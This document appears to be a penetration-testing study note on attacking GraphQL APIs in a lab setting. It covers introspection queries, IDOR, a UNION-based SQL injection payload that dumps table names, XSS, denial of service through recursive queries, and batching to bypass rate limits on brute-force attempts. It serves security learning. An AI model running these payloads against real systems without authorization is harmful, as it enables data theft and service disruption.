[GraphQL](https://graphql.org/) is a query language typically used by web `APIs` as an alternative to REST. It enables the client to fetch required data through a simple syntax while providing a wide variety of features typically provided by query languages, such as SQL. 

Like REST APIs, GraphQL APIs can read, update, create, or delete data. However, GraphQL APIs are typically implemented on a single endpoint that handles all queries. As such, one of the primary benefits of using GraphQL over traditional REST APIs is the efficiency in resource utilization and request handling.

We can identify the GraphQL engine used by the web application using the tool [graphw00f](https://github.com/dolevf/graphw00f). It will send various GraphQL queries, including malformed ones, to try to identify the GraphQL engine used.
```bash
# -f to fingerprint, -d to use detect mode
python3 main.py -d -f -t http://172.17.0.2
```

# Introspection 
[Introspection](https://graphql.org/learn/introspection/) is a GraphQL feature that enables users to query the GraphQL API about the `structure of the backend system`. As such, users can use introspection queries to obtain all queries supported by the API schema. These introspection queries query the `__schema` field.

We can identify all GraphQL types supported by the backend using the following query:
```graphql
{
  __schema {
    types {
      name
    }
  }
}
```

Furthermore, we can obtain all the queries supported by the backend using this query:
```graphql
{
  __schema {
    queryType {
      fields {
        name
        description
      }
    }
  }
}
```

Here is a `"general"` introspection query that dumps all information about types, fields, and queries supported by default : 
```graphql
query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                  }
                }
              }
            }
          }
        }
      }
    }
```

We can visualize the schema using the tool [GraphQL-Voyager](https://github.com/APIs-guru/graphql-voyager) that we have to self-host if we're working with confidential data, or we can use the [demo version](https://apis.guru/graphql-voyager/) otherwise.

We can then try to `query` some fields of the database to try to leak sensitive information.

# IDOR 
Using `GraphQL` queries, we should try to access data we are not authorized to access, or data that can be accessed without authorization. It could be user information enumeration for example.

# SQL Injection
`SQL` injection can inherently occur in GraphQL APIs that do not properly sanitize user input from arguments in the SQL queries. 

- To identify if a query requires an argument, we can send the query without any arguments and analyze the response.

As the GraphQL query only returns the first row, we need to use the `GROUP_CONCAT` function to exfiltrate multiple rows at a time. This enables us to exfiltrate all table names in the current database with the following payload:
```sql
{
  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
    username
  }
}
```

# XSS 
`XSS vulnerabilities` can occur if GraphQL responses are inserted into the HTML page without proper sanitization.

`XSS vulnerabilities` can also occur if invalid arguments are reflected in error messages, if an `XSS payload` is reflected without proper encoding in the GraphQL error message.

# DoS
We can try to create some `GraphQL queries` that result in exponentially large responses, requiring significant resources to process. This can lead to high hardware utilization, and thus DoS.

- We can try to identify a `loop` between fields. For example here, we can identify a loop between the `UserObject` and `PostObject` via the `author` and `posts` fields :
<img width="962" height="408" alt="image" src="https://github.com/user-attachments/assets/50c99849-c8b9-4ed2-a6b5-aa1457d450d6" />
We can abuse this `loop` by constructing a query that queries the author of all posts. For each author, we then query the author of all posts again.

If we repeat this many times, the result grows exponentially larger, potentially resulting in a DoS scenario.

## Batching Attacks
Batching in GraphQL refers to executing `multiple queries` with a `single request`. We can do so by directly supplying multiple queries in a JSON list in the HTTP request.

For instance, we can query the ID of the user admin and the title of the first post in a single request:
```http
Code: http
POST /graphql HTTP/1.1
Host: 172.17.0.2
Content-Length: 86
Content-Type: application/json

[
	{
		"query":"{user(username: \"admin\") {uuid}}"
	},
	{
		"query":"{post(id: 1) {title}}"
	}
]
```
Batching is not a security vulnerability but an intended feature that can be enabled or disabled. However, batching can lead to security issues if GraphQL queries are used for sensitive processes such as user login.

Since batching enables an attacker to provide multiple GraphQL queries in a single request, it can potentially be used to conduct brute-force attacks with significantly fewer HTTP requests. This could lead to bypasses of security measures in place to prevent brute-force attacks, such as rate limits.

# Mutations
GraphQL also provides a way to modify data with `mutations` : those are GraphQL queries that `modify` server data. They can be used to `create` new objects, `update` existing objects, or `delete` existing objects.

We can use an `introspection query` to identify all mutations supported by the backend and their arguments : 
```graphql
query {
  __schema {
    mutationType {
      name
      fields {
        name
        args {
          name
          defaultValue
          type {
            ...TypeRef
          }
        }
      }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}
```
We then need to see the `inputs` needed by the objects, and identify the fields that we can use in mutation.

# Tools
We can use the tool [GraphQL-Cop](https://github.com/dolevf/graphql-cop), a security audit tool for GraphQL APIs that can identify multiple basic security configuration checks, and lists all identified issues
```bash
python3 graphql-cop/graphql-cop.py -t http://172.17.0.2/graphql
```

- [InQL](https://github.com/doyensec/inql) is a Burp extension we can install via the BApp Store in Burp. The extension adds `GraphQL` tabs in the Proxy History and Burp Repeater that enable simple modification of the GraphQL query without having to deal with the encompassing JSON syntax:

Furthermore, we can right-click on a GraphQL request and select `Extensions > InQL - GraphQL Scanner > Generate queries with InQL Scanner`. Afterward, InQL generates introspection information. The information regarding all mutations and queries is provided in the `InQL` tab for the scanned host.

# Prevention
[Here](https://academy.hackthebox.com/module/271/section/3158) we can have a list of `GraphQL` vulnerability prevention.
